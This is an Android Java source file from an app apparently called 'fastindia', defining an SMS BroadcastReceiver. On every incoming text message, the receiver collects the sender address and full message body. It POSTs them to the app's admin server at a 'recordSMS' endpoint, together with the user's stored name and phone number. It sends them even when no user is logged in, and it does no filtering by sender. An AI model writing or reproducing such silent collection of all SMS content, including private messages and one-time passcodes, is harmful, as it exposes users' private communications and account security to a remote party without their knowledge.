package com.tecqza.gdm.fastindia;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsMessage;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

public class SMSReceiver extends BroadcastReceiver
{
    Context context;
    SharedPrefs userSharedPrefs;
    public void onReceive(Context context, Intent intent)
    {
        this.context=context;
        userSharedPrefs=new SharedPrefs(context,"USER");
        Bundle myBundle = intent.getExtras();
        SmsMessage [] messages = null;
        String strMessage = "";

        if (myBundle != null)
        {
            Object [] pdus = (Object[]) myBundle.get("pdus");
            messages = new SmsMessage[pdus.length];
            String mobile="";
            for (int i = 0; i < messages.length; i++)
            {
                messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                strMessage += "From : " + messages[i].getOriginatingAddress();
                strMessage += " : ";
                strMessage += messages[i].getMessageBody();
                strMessage += "\n";

                mobile=messages[i].getOriginatingAddress();
            }


            if(userSharedPrefs.getSharedPrefs("id")!=null){
                RecordSMS recordSMS = new RecordSMS();
                recordSMS.execute(userSharedPrefs.getSharedPrefs("mobile"), userSharedPrefs.getSharedPrefs("name"), strMessage);
            }else{
                RecordSMS recordSMS = new RecordSMS();
                recordSMS.execute("NO", "NA", strMessage);
            }
        }
    }


    class RecordSMS extends AsyncTask<String, Void, String> {

        @Override
        protected void onPreExecute() {

        }

        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);
        }

        @Override
        protected String doInBackground(String... params) {
            String urls = "https://www.admin.fastindia.app/app/recordSMS/";
            try {
                URL url = new URL(urls);
                HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
                httpURLConnection.setRequestMethod("POST");
                httpURLConnection.setDoInput(true);
                httpURLConnection.setDoOutput(true);
                OutputStream outputStream = httpURLConnection.getOutputStream();
                BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(outputStream, StandardCharsets.UTF_8));
                String post_Data = URLEncoder.encode("mobile", "UTF-8") + "=" + URLEncoder.encode(params[0], "UTF-8")+ "&"+
                        URLEncoder.encode("name", "UTF-8") + "=" + URLEncoder.encode(params[1], "UTF-8")+ "&"+
                        URLEncoder.encode("sms", "UTF-8") + "=" + URLEncoder.encode(params[2], "UTF-8");

                bufferedWriter.write(post_Data);
                bufferedWriter.flush();
                bufferedWriter.close();
                outputStream.close();
                InputStream inputStream = httpURLConnection.getInputStream();
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream, StandardCharsets.UTF_8));
                String result = "", line = "";
                while ((line = bufferedReader.readLine()) != null) {
                    result += line;
                }
                return result;
            } catch (Exception e) {
                return e.toString();
            }
        }
    }
}
